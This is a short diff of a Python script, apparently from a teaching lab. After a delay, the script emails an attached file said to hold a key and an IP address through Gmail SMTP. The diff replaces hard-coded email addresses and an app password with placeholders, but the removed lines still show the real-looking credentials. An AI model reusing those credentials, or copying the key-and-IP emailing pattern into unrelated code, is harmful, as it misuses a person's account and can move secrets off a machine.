@@ -35,8 +35,8 @@ time.sleep(300)
 
 
 #Send Key and IP to the students
-fromaddr = "kowshalyaa.jk@gmail.com"
-toaddr = "kausalya2571998@gmail.com"
+fromaddr = "@gmail.com"
+toaddr = "@gmail.com"
 msg = MIMEMultipart() 
 msg['From'] = fromaddr 
 msg['To'] = toaddr 
@@ -61,7 +61,7 @@ p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 msg.attach(p) 
 s = smtplib.SMTP('smtp.gmail.com', 587) 
 s.starttls() 
-s.login(fromaddr, "mwlxdhtfndasmxjb") 
+s.login(fromaddr, "pwd") 
 text = msg.as_string() 
 s.sendmail(fromaddr, toaddr, text) 
 s.quit() 
